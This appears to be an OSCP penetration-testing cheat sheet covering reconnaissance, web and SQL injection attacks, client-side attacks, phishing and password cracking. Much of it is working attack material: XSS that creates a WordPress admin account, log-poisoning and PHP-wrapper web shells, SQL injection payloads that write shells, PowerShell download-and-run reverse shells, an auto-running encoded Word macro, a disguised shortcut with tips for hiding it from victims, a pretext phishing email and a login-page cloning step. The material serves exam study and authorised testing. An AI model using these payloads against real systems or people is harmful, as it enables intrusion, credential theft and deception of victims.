# OSCP CheatSheet

## **Information gathering**

### **Passive Information Gathering**

#### Passive Enumeration

**Whois**

```bash
whois domain.com
whois <IP>       # Reverse lookup
```

**theHarvester**

```bash
theHarvester -d  domain.com -l 100 -b google
```

**Google Dork**

```bash
site:[website] filetype:[filetype]
site:[website] -filetype:[filetype]
cache:[URL]
intitle:"index of" "parent directory"
intext:"domain.com" "passwords"
```

**Open-Source Code**

*Github Search - owner:domain*

[Gitleaks](https://github.com/gitleaks/gitleaks)

**Tools :**

- [Shodan](https://www.shodan.io/)
- [Exploits Shodan](https://exploits.shodan.io/)
- [Maltego](https://www.maltego.com)
- [DNSdumpster](https://dnsdumpster.com)
- [Netcraft](https://searchdns.netcraft.com)
- [SecurityHeaders](https://securityheaders.com/)
- [SSLTest](https://www.ssllabs.com/ssltest/)
- [GoogleDork](https://dorksearch.com/)

---

### **LLM-Powered Passive Information Gathering**

#### **Passive LLM-Aided enumeration**

*prompts:*

- `whois megacorpone.com`
- `Can you print out all the public information about company structure and employees of megacorpone?`
- `can you provide the best 20 google dorks for megacorpone.com website tailored for a penetration test?`
- `Retrieve the technology stack of the megacorpone.com website`
- `…`

---

### **Active Information Gathering**

*Living off the Land* pre installed and trusted Windows binaries.  

[LOLBAS](https://lolbas-project.github.io/)

> 
> 
> 
> Each domain can use different types of DNS records. Some of the most
> common types of DNS records include:
> 
> - **NS**: Nameserver records contain the name of the authoritative
> servers hosting the DNS records for a domain.
> - **A**: Also known as a host record, the "*a record*" contains the IPv4
> address of a hostname (such as www.megacorpone.com).
> - **AAAA**: Also known as a quad A host record, the "*aaaa record*"
> contains the IPv6 address of a hostname (such as www.megacorpone.com).
> - **MX**: Mail Exchange records contain the names of the servers
> responsible for handling email for the domain. A domain can contain
> multiple MX records.
> - **PTR**: Pointer Records are used in reverse lookup zones and can
> find the records associated with an IP address.
> - **CNAME**: Canonical Name Records are used to create aliases for
> other host records.
> 
> - **TXT**: Text records can contain any arbitrary data and be used
> for various purposes, such as domain ownership verification.

**Host / Dig**

```bash
host [domain]
host -t NS [domain]
host -t MX [domain]
host -t TXT [domain]
host -t PTR [IP]

for ip in $(cat list.txt); do host $ip.domain.com; done
for ip in $(seq 200 254); do host 10.10.10.$ip; done | grep -v "not found"

---------------------------------------------------------------------------------

dig any [domain]
dig any [domain] @[DNSIP]
```

**DNS Enumeration Tools**

- *Dnsrecon*
    - `dnsrecon -d [domain] -n [DNS IP]`
    - `dnsrecon -d [domain] -n [DNS IP] -t std`
    - `dnsrecon -d [domain] -D ~/list.txt -t brt`
- *Dnsenum*
    - `dnsenum [domain]`
    - `dnsenum [domain] --dnsserver [DNS IP]`
    - `dnsrecon -d [domain] -D ~/list.txt -t brt`
- *Fierce*
    - `fierce --domain [domain]`
    - `fierce --domain [domain] --dns-servers [DNS IP]`
    - `fierce --domain [domain] --dns-servers {IP}`
- N*SLookup - “Living off the Land”*
    - `nslookup [domain]`
    - `nslookup -type=[type] [domain]`
    - `nslookup -type=any [domain] [DNS IP]`

#### Port Scanning with Nmap

***Host Discovery:***

- `nmap -sn [netblock]`
- `fping -asgq [netblock]`

***Scanning techniques:***

```bash
nmap -sS target                         # SYN/Stealth scan
nmap -sA target                         # ACK scan
nmap -sF target                         # FIN scan
nmap -sN target                         # Null scan
nmap -sO target                         # IP Protocol scan
nmap -sX target                         # XMAS scan
```

***Idle/Zombie scan:***

- `nmap -O -v -n [targetZombie]`
- `nmap --script ipidsec [targetZombie]`
- `nmap -Pn -sI [targetZombie]:[port] [target] -p [port] -v`

***FTP bounce scan :***

- `nmap -Pn -b [vulnerableFTP] [target]`

***Service and OS detection:***

```bash
nc [targetIP]:[Port]                      # Banner Grabbing
nmap -sV target                           # Version Scan
nmap -sV -sC target                       # Version/Script Scan
nmap -O target                            # OS Detection
nmap -A target                            # Version/Script/OS/Traceroute Scan
```

***Firewall/IDS Evasion:***

- *Fragmentation*
    - `nmap -sS -f [target]`
    - `nmap -sS -f --data-lenght 100 [target]`
- *Decoy*
    - `nmap -sS -D [spoofIP],[spoofIP],ME,[spoofIP] [target]`
    - `nmap -sS -D RND:10 [target]`
- *Source ports*
    - `nmap -sS --source-port [source port] [target]`
- *Packet Header*
    - `nmap -sS --data-lenght 10 [target]`
- *Mac address spoofing*
    - `nmap -sS --spoof-mac [mac] [target]`
- *Timing*
    - `nmap -iL [hosts.txt] -sS -T [Timing option]`
        
        

***Living Off the Land*** 

```powershell
Test-NetConnection -Port [port] [IP]

1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("[IP]", $_)) "TCP port $_ is open"} 2>$null
```

#### **SMB Enumeration**

***NetBIOS Enumeration:***

- *Windows*
    - `nbtstat -n`
    - `nbtstat -A <IP>`
- *Linux*
    - `nbtscan -v <IP/NETBLOCK>`

**SMB Shared Folder Enumeration**

- *Windows*
    - `net view \\dc01 /all`
    - `net use K: \\dc01\share`
- Linux
    - `smbclient -N -L <IP>`
    - `impacket-smbcliet <IP>`

**Nmap SMB Scripts** - `ls -1 /usr/share/nmap/scripts/smb*`

#### **SMTP Enumeration**

```powershell
## Nmap Enumeration
nmap --script smtp-* <IP_Address> -p25

## Connect to target
nc <IP> 25
telnet <IP> 25

## Start Communication
> HELO domain.com                      

## User Enumeeration
> MAIL FROM: user@domain.com
> RCPT TO: root@domain.com              
> EXPN root                             
> VRFY root                            

$ smtp-user-enum -M VRFY -U users.txt -t <IP_Address>
$ smtp-user-enum -M EXPN -U users.txt -t <IP_Address>
$ smtp-user-enum -M RCPT -U users.txt -t <IP_Address>
$ smtp-user-enum -M VRFY -u root -t <IP_Address>
```

***Enable Telnet on Windows***

`PS > dism /online /Enable-Feature /FeatureName:TelnetClient`

***Python Script***

```python
#!/usr/bin/python

import socket
import sys

if len(sys.argv) != 3:
        print("Usage: vrfy.py <username> <target_ip>")
        sys.exit(0)

## Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

## Connect to the Server
ip = sys.argv[2]
connect = s.connect((ip,25))

## Receive the banner
banner = s.recv(1024)

print(banner)

## VRFY a user
user = (sys.argv[1]).encode()
s.send(b'VRFY ' + user + b'\r\n')
result = s.recv(1024)

print(result)

## Close the socket
s.close()
```

#### **SNMP Enumeration**

***SNMP MIB TREE***

| 1.3.6.1.2.1.25.1.6.0 | System Processes |
| --- | --- |
| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path |
| 1.3.6.1.2.1.25.4.2.1.5 | Processes Param |
| 1.3.6.1.2.1.2.2.1.2 | Interfaces |
| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units |
| 1.3.6.1.2.1.25.6.3.1.2 | Software Name |
| 1.3.6.1.4.1.77.1.2.25 | User Accounts |
| 1.3.6.1.2.1.6.13.1.3 | TCP Local Ports |

***Nmap Script Scan***

`nmap -sU -p 161 --script [script_name] [target]`

***Nmap Community String Brute Force***

`nmap -sU -p 161 --script snmp-brute [target]`

`nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=<wordlist> [target]`

***Wordlist*** - */usr/share/wordlist/seclists/Misc/wordlist-common-snmp-community-strings.txt*

***onesixtyone Community String Brute Force***

```powershell
## Wordlist */usr/share/seclists/Misc/wordlist-common-snmp-community-strings.txt*
echo public > community
echo private >> community
echo manager >> community

for ip in $(seq 1 254); do echo 10.10.10.$ip; done > ips

onesixtyone -c community -i ips
```

***snmpwalk Enumeration***

`snmpwalk -v [1/2c/3] -c [community string] [target_ip] [MIB]`

`snmpwalk -v [1/2c/3] -c [community string] [target_ip] [MIB] -O a`

***snmpwalk Change Value of an Attribute***

`snmpset -v [1/2c/3] -c [community string] [target_ip] [MIB] [var type] [value]`

### LLM-Powered Active Information Gathering

#### **Active LLM-Aided enumeration**

***Generate Subdomains*** 

```
Using public data from [MegacorpOne's] website and any information that can be inferred about its organizational structure, products, or services, generate a comprehensive list of potential subdomain names.
	•	Incorporate common patterns used for subdomains, such as:
	•	Infrastructure-related terms (e.g., "api", "dev", "test", "staging").
	•	Service-specific terms (e.g., "mail", "auth", "cdn", "status").
	•	Departmental or functional terms (e.g., "hr", "sales", "support").
	•	Regional or country-specific terms (e.g., "us", "eu", "asia").
	•	Factor in industry norms and frequently used terms relevant to [MegacorpOne's] sector.

Finally, compile the generated terms into a structured wordlist of 1000  words, optimized for subdomain brute-forcing against megacorpone.com

Ensure the output is in a clean, lowercase format with no duplicates, no bulletpoints and ready to be copied and pasted.
Make sure the list contains 1000 unique entries.
```

***DNS Enumeration***

`gobuster dns -d [domain.com] -w [LLM Wordlist] -t 10`

---

## Vulnerability Scanning

### **Vulnerability Scanning with Nessus**

#### **Installing Nessus**

***Install via Docker:***

`docker pull tenable/nessus:latest-ubuntu`

`docker run --name "Nessus" -d -p 8834:8834 tenable/nessus:latest-ubuntu`

***Install Locally***

```bash
curl --request GET \
  --url 'https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.9.1-ubuntu1804_aarch64.deb' \
  --output 'Nessus-10.9.1-ubuntu1804_aarch64.deb'
```

`sudo apt install ./Nessus-10.9.1-ubuntu1804_aarch64.deb`

`sudo systemctl start nessusd.service`

---

### **Vulnerability Scanning with Nmap**

#### **NSE Vulnerability Scripts**

***Nmap Scripts***

`cd /usr/share/nmap/scripts/`

`cat script.db  | grep "\"vuln\"”`

`sudo nmap -sV -p 443 --script "vuln" [IP]`

***Run Script Manually***

```bash
wget https://raw.githubusercontent.com/RootUp/PersonalStuff/master/http-vuln-cve-2021-41773.nse

sudo cp /home/kali/Downloads/http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse
sudo nmap --script-updatedb

sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" [IP]
```

---

## **Introduction to Web Application Attacks**

### **Web Application Assessment Tools**

***Fingerprinting Web Servers with Nmap***

- `sudo nmap -p80,443  -sV [IP]`
- `sudo nmap -p80 --script=http-enum [IP]`

***Technology Stack Identification with Wappalyzer***

[Wappalyzer](https://www.wappalyzer.com/lookup/crystal.ge/)

***Directory Brute Force***

- `ffuf -c -w [wordlist] -u [URL/FUZZ]`
- `gobuster dir -w [wordlist] -u [URL] -t 5`

### **Web Application Enumeration**

- ***Debugging Page Content***
    - Firefox → Debugger
    - Firefox → Inspector
- **Inspecting HTTP Response Headers and Sitemaps**
- **Enumerating and Abusing APIs**
    - `ffuf -c -w [wordlist] -u [URL:FUZZ/v1]`
    - `ffuf -c -w [wordlist] -u [URL:FUZZ/v2]`
    - `ffuf -c -w [wordlist] -u [URL:FUZZ/v3]`
    - `ffuf -c -w [wordlist] -u [URL:FUZZ/v4]`

### **Cross-Site Scripting**

***Wordpress - Create admin user via XSS***

```jsx
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

[JSCompress - The JavaScript Compression Tool](https://jscompress.com/)

***Encode the JavaScript code, so any bad characters won't interfere with sending the payload***

```jsx
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)

```

***Final Exploit***

```bash
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(Encoded Javascript Code))</script>" --proxy 127.0.0.1:8080
```

***Wordpress Vulnerable Plugin:***

[WordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload](https://www.exploit-db.com/exploits/36374)

[https://github.com/4m3rr0r/Reverse-Shell-WordPress-Plugin](https://github.com/4m3rr0r/Reverse-Shell-WordPress-Plugin)

---

## **Common Web Application Attacks**

### **Directory Traversal**

- ***Absoluta Path:***
    - `/etc/passwd`
- ***Relative path:***
    - `../../../etc/passwd`

***Identifying and Exploiting Directory Traversals:***

- ***Windows:***
    - C:\Windows\System32\drivers\etc\hosts
- ***Linux***:
    - /etc/passwd

***Encoding Special Characters***
`curl http://domain.com/cgi-bin/2%e/2%e/2%e/2%e/2%e/etc/passwd`

### **File Inclusion Vulnerabilities**

<aside>
💡

File Inclusion vulnerabilities can execute local or remote files, while Directory Traversal only allows us to read the contents of a file

</aside>

#### **Local File Inclusion (LFI)**

***Apache Log Files***

- **Linux**
    - /var/log/apache2/access.log
- **Windows**
    - C:\xampp\apache\logs\

***Apache Log Poisoning***

```bash
#Linux
curl --path-as-is "http://doman.com/index.php?page=../../../../../var/log/apache2/access.log"

curl --path-as-is "http://doman.com/index.php?page=../../../../../var/log/apache2/access.log" -H "User-Agent: <?php echo system(\$_GET['cmd']); ?>"

curl --path-as-is "http://doman.com/index.php?page=../../../../../var/log/apache2/access.log&cmd=whoami"

#Windows
curl --path-as-is "http://doman.com/index.php?page=../../../../../xampp/apache/logs/access.log"

curl --path-as-is "http://doman.com/index.php?page=../../../../../xampp/apache/logs/access.log" -H "User-Agent: <?php echo system(\$_GET['cmd']); ?>"

 curl --path-as-is "http://doman.com/index.php?page=../../../../../xampp/apache/logs/access.log&cmd=whoami"
```

#### **PHP Wrappers**

| PHP Wrappers | Description |
| --- | --- |
| /index.php?page=php://filter/read=convert.base64-encode/resource=admin.php | Read PHP with base64 filter |
| /index.php?page=data://text/plain,<?php echo system('ls');?> | RCE with data wrapper |
| /index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls | RCE with base64 encoded data wrapper |
| index.php?page=expect://id | RCE with expect wrapper |
| curl -s -X POST --data '<?php system($_GET["cmd"]); ?>'
"http://<SERVER_IP>:<PORT>/index.php?page=php://input&cmd=id" | RCE with input wrapper |

#### **Remote File Inclusion (RFI)**

<aside>
💡

We could also use a publicly-accessible file, such as one from Github.

</aside>

```bash
## Webshells - /usr/share/webshells/

python3 -m http.server 80

curl "http://domain.com/index.php?page=http://<Local IP>/simple-backdoor.php&cmd=whoami"
```

### **File Upload Vulnerabilities**

#### **Using Executable Files**

<aside>
💡

Upload malicious files. In case of extension blacklist, enumerate web server and framework and use extension bypass techniques accordingly. 

</aside>

#### Using Non-Executable Files

<aside>
💡

Leverage File Upload with Directory Traversal vulnerability, that allows us to overwrite critical files such as SSH a*uthorized_keys* file.

Example:  ***filename="../../../../../../../root/.ssh/authorized_keys”***

</aside>

<aside>
💡

When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.

</aside>

### Command Injection

***Check where command is executed (CMD/PowerShell):***

```powershell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

***Using Powercat to Create Reverse Shell***

```powershell
#Upload Powercat to Vulnerable Windows
cd /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1
python3 -m http.server 80

## Execute Powercat to get a Reverse Shell
IEX (New-Object System.Net.Webclient).DownloadString("http://<IP>/powercat.ps1");powercat -c <IP> -p <PORT> -e powershell 
```

---

## SQL Injection Attacks

### SQL Theory and Databases

#### **DB Types and Characteristics**

***MySQL***

```sql
mysql -u [user] -p [pass] -h [IP] -P [PORT] --skip-ssl

MySQL > select version();
MySQL > select system_user();
MySQL > show databases;
MySQL > SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
```

<aside>
💡

The *root* user retrieved with *select system_user();* is the database-specific root
user, not the system-wide administrative root user.

</aside>

***MSSQL***

```sql
impacket-mssqlclient [USER]:[PASS]@[IP] -windows-auth

SQL > SELECT @@version;
SQL > SELECT name FROM sys.databases;
SQL > SELECT * FROM offsec.information_schema.tables;
SQL > SELECT * from offsec.dbo.users;
SQL > SELECT * FROM master.sys.server_principals
```

### **Manual SQL Exploitation**

#### **Error-based Payloads**

***SQL code vulnerable to Error-based SQL Injection***

```php
<?php
$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```

***Error-based payloads***

```markdown
## Auth Bypass.
offsec' OR 1=1 -- // 

## Enumerating the database directly
offsec' OR 1=1 in (SELECT @@version) -- //
offsec' OR 1=1 in (SELECT * FROM users) -- //
offsec' or 1=1 in (SELECT password FROM users) -- //
offsec' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //

```

#### **UNION-based Payloads**

***SQL code vulnerable to UNION-based SQL Injection***

```php
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```

For **UNION** SQLi attacks to work, first need to satisfy two
conditions:

1. The injected **UNION** query has to include the same number of columns as the original query.
2. The data types need to be compatible between each column.

***UNION-based payloads***

```markdown
## Discover the correct number of columns
' ORDER BY 1-- //   

## Determine which columns are displayed
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //

## Enumerate the database
%' UNION SELECT database(), user(), @@version, null, null -- //
%' UNION SELECT null, null, database(), user(), @@version -- //

' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //

' UNION SELECT null, username, password, description, null FROM users -- //
```

#### **Blind SQL Injections**

***BLIND SQLi payloads***

```markdown
## Test for boolean-based SQLi
offsec' AND 1=1 -- //

## Test for time-based SQLi
offsec' AND IF (1=1, sleep(3),'false') -- //

```

### **Manual and Automated Code Execution**

#### **Manual Code Execution**

***MSSQL - xp_cmdshell***

```sql
impacket-mssqlclient [USER]:[PASS]@[IP] -windows-auth

EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

**MySQL - write files on the web server.**

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

#### **Automating the Attack**

***SQLmap***

```bash
sqlmap -r [request] -p [param]  --os-shell  --web-root "/var/www/html/"
```

---

## **Client-side Attacks**

### **Target Reconnaissance**

#### **Information Gathering**

***Browser through the target website and gather metadata of documents:***

`exiftool -a -u document.pdf`

#### **Client Fingerprinting**

***Device Fingerprinting via [canavarytokens](https://canarytokens.com/nest/)***

[Know.  Before it matters](https://canarytokens.com/nest/)

***User-Agent header parser via [whatismybrowser.com](https://explore.whatismybrowser.com/useragents/parse/)***

[](https://explore.whatismybrowser.com/useragents/parse/)

***Browser Fingerprint via [fingerprintjs](https://github.com/fingerprintjs/fingerprintjs)***

[https://github.com/fingerprintjs/fingerprintjs](https://github.com/fingerprintjs/fingerprintjs)

### **Exploiting Microsoft Office**

#### **Preparing the Attack**

> To deliver our payload and increase the chances that the target opens the document, we could use a pretext and provide the document in another way, like a download link.
> 

> Convince the target to click the *Enable Editing* button by, for
example, blurring the rest of the document and instructing them to
click the button to "unlock" it.
> 

> We could also rely on other macro-enabled Microsoft Office programs that
lack Protected View, like *Microsoft Publisher*, but this is less frequently installed.
> 

> Finally, we must consider [Microsoft's announcement](https://techcommunity.microsoft.com/t5/microsoft-365-blog/helping-users-stay-safe-blocking-internet-macros-by-default-in/ba-p/3071805) that discusses blocking macros by default
> 

#### **Leveraging Microsoft Word Macros**

> **.doc** and **.docm** can save or embed macros, while **.docx** cant.
> 

> Choose Document1 (document) from the drop-down menu in the Macros dialog window to select our unnamed document. If do not, our macro will not be saved to the document but rather to our global template.
> 

***Example of macros***

```bash
Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```

***Auto execute Powershell when a Word document is opened***

```bash
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

End Sub
```

***Reverse Shell macros via base64 encoded PowerCat***

> We should note that VBA has a 255-character limit for literal strings and therefore, we can't just embed the base64-encoded PowerShell commands as a single string. This restriction does not apply to strings stored in variables, so we can split the commands into multiple lines (stored in strings) and concatenate them.
> 

<aside>
💡

UTF-16LE is the default character set for base64 encoding that PowerShell supports. If we choose any other character set, our payload won’t work.

</aside>

```markdown
## PowrCat Reverse Shell Script
echo -n "IEX(New-Object System.Net.WebClient).DownloadString('http://<IP>/powercat.ps1');powercat -c <IP> -p <PORT> -e powershell" | iconv -t UTF-16LE | base64 -w 0

python3 -m http.server 80

## Python Script to split the commands into multiple lines
str = "powershell.exe -nop -w hidden -enc <base64 encoded PowerCat script>"
n = 50
for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
	
	
## Macro to get RCE
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub
```

### **Abusing Windows Library Files**

#### **Obtaining Code Execution via Windows Library Files**

> Windows library files are virtual containers for user content. They
connect users with data stored in remote locations like web services
or shares. These files have a **.Library-ms** file extension and can
be executed by double-clicking them in Windows Explorer.
> 

***set up a WebDAV / SMB share on our Kali system***

```bash
## https://wsgidav.readthedocs.io/en/latest/index.html
pip3 install wsgidav
apt install python3-wsgidav

/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

***Create a Windows library file connecting to a [WebDAV](https://en.wikipedia.org/wiki/WebDAV) share***

[***namespace](https://docs.microsoft.com/en-us/windows/win32/shell/library-schema-entry#namespace-versioning) for the library file***

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
...
...
...
</libraryDescription>
```

***Add two tags providing information about the library***

> We can use ***@shell32.dll,-34575*** or ***@windows.storage.dll,-34582***
> 

```xml
<name>@windows.storage.dll,-34582</name>
<version>6</version>
```

***Add the [isLibraryPinned](https://docs.microsoft.com/en-us/windows/win32/shell/schema-library-islibrarypinned) and [iconReference](https://docs.microsoft.com/en-us/windows/win32/shell/schema-library-iconreference) tag***

```xml
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
```

***Add the [templateInfo](https://docs.microsoft.com/en-us/windows/win32/shell/schema-library-templateinfo) tags, which contain the [folderType](https://docs.microsoft.com/en-us/windows/win32/shell/schema-library-foldertype) tags***

```xml
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
```

***Specify the storage location where our library file should point to***

```xml
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://10.10.10.10</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
```

***Entire Library File***

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://10.10.10.10</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

***Create Shortcut file and store it in WebDav share to get Reverse Shell***

```markdown
## Right-click on the desktop and click on New then on Shortcut
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:8000/powercat.ps1'); powercat -c 192.168.119.3 -p 4444 -e powershell"
```

<aside>
💡

If we expect that our victims are tech-savvy enough to check where the shortcut files are pointing, we can use a handy trick. Since our provided command looks very suspicious, we could just put a delimiter and benign command behind it to push the malicious command out of the visible area in the file's property menu. If a user were to check the shortcut, they would only see the benign command.

</aside>

**Flow**

```markdown
## Pretext Email Example
Hello! My name is Dwight, and I'm a new member of the IT Team. 

This week I am completing some configurations we rolled out last week.
To make this easier, I've attached a file that will automatically
perform each step. Could you download the attachment, open the
directory, and double-click "automatic_configuration"? Once you
confirm the configuration in the window that appears, you're all done!

If you have any questions, or run into any problems, please let me
know!

## Send crafted config.Library-ms file via attached file.
## Victim opens the config.Library-ms that points to File Explorer
## File Explorer shows WebDAV share that contains crafted Reverse Shell Shortcut 
```

<aside>
💡

> We could also have combined this technique with our previous Office macro attack, or any other type of client-side attacks.
> 
</aside>

---

## **Locating Public Exploits**

***Online Exploit***

- **ExploitDB**

***Offline Exploit***

- **SearchSploit**
    - `sudo apt update && sudo apt install exploitdb`
    - `searchsploit -m windows/remote/48537.py`
- ***Nmap NSE Scripts***
    - `grep Exploits /usr/share/nmap/scripts/*.nse`

---

## **Fixing Exploits**

### **Fixing Memory Corruption Exploits**

#### **Buffer Overflow in a Nutshell**

***Vulnerable code that holds 64 Bit char in buffer variable***

```c
*buffer[64]*
...
strcpy(buffer, argv[1]);
```

![image.png](OSCP%20CheatSheet/image.png)

#### **Cross-Compiling Exploit Code**

***MinGW-w64 Compiler***

```bash
sudo apt install mingw-w64

i686-w64-mingw32-gcc [C Program] -o [Output]

wine [Output]
```

***Generate C Shellcode***

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a" -v shellcode
```

---

## Phishing Basics

### Payloads, Misdirection, and Speedbumps

> Attackers can bypass MotW using exploits like [CVE-2022-41091](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41091), though security patches often close these gaps quickly.
> 

> If an **EXE** file reached its intended destination, most users are aware of the danger of this type of file. Because of this, attackers have moved to other types of files, including [SCRfiles](https://www.malwarebytes.com/blog/news/2014/11/rogue-scr-file-links-circulating-in-steam-chat), [HTA files](https://trustedsec.com/blog/malicious-htas), and [JScriptfiles](https://www.broadcom.com/support/security-center/protection-bulletin/yet-another-jscript-rat-spreads-via-phishing-campaign).
> 

***Microsoft Office Vulnerabilities***

- https://nvd.nist.gov/vuln/detail/CVE-2023-21716
    - [PoCs for this vulnerability](https://github.com/JMousqueton/CVE-2023-21716)
- https://nvd.nist.gov/vuln/detail/CVE-2017-11882
- https://nvd.nist.gov/vuln/detail/CVE-2023-21608
    - [public PoCs for this vulnerability](https://github.com/hacksysteam/CVE-2023-21608)

***URL Shortener***

- [TinyURL](https://tinyurl.com/)
- [Bitly](https://bitly.com/)

***NTLM Theft***

[https://www.proofpoint.com/uk/blog/threat-insight/ta577s-unusual-attack-chain-leads-ntlmdata-theft](https://www.proofpoint.com/uk/blog/threat-insight/ta577s-unusual-attack-chain-leads-ntlm-data-theft)

***MFA Bypass Techniques***

- [*prompt bombing*](https://www.tripwire.com/state-of-security/mfa-prompt-bombing-what-you-need-know)
- [*browser-in-the-middle*](https://capec.mitre.org/data/definitions/701.html)
    - [*cuddlephish*](https://github.com/fkasler/cuddlephish)
- Brute Force
- SIM Swapping
- Social Enginerring

### Hands-On Credential Phishing

***Cloning the Website***

```bash
mkdir CloneWeb
cd CloneWeb

wget -E -k -K -p -e robots=off -H -Dzoom.us -nd "https://zoom.us/signin#/login"

python3 -m http.server 80
```

***Remove OWASP CSRFGuard***

```bash
grep "OWASP" *
grep "csrf_js" *
```

***Use LLM to make it look like the main website***

---

## **Password Attacks**

### Attacking Network Services Logins

***SSH***

```bash
hydra -l [user] -P [passwords] -s [Port] ssh://[IP]
```

***RDP***

```bash
hydra -L [users] -p [password] rdp://[IP]
```

***HTTP POST Login Form***

```bash
hydra -l [user] -P [passwords] [IP] http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

### **Password Cracking Fundamentals**

#### Introduction to Encryption, Hashes and Cracking

- [*Symmetric encryption*](https://en.wikipedia.org/wiki/Symmetric-key_algorithm)
    - AES
- [*Asymmetric encryption*](https://en.wikipedia.org/wiki/Public-key_cryptography)
    - RSA
- [Hash](https://en.wikipedia.org/wiki/Hash_function)
    - SHA / MD5

***Calculate Cracking Time***

```markdown
## Calculate the keyspace for a five-character password
echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
python3 -c "print(62**5)"

## Check Hashcat benchmaks
hashcat -b

## Calculate Time in Seconds - Convert Benchmark
python3 -c "print([Keyspace for *-characted password] / [Hashcat Benchmark])"
```

#### **Mutating Wordlists**

```markdown
## Hashcat Rules
ls -la /usr/share/hashcat/rules

## Create Rule Hashcat Cheat Sheet
https://hashcat.net/wiki/doku.php?id=rule_based_attack

## Create Rule - Hashcat Example
echo "c" > demo.rule
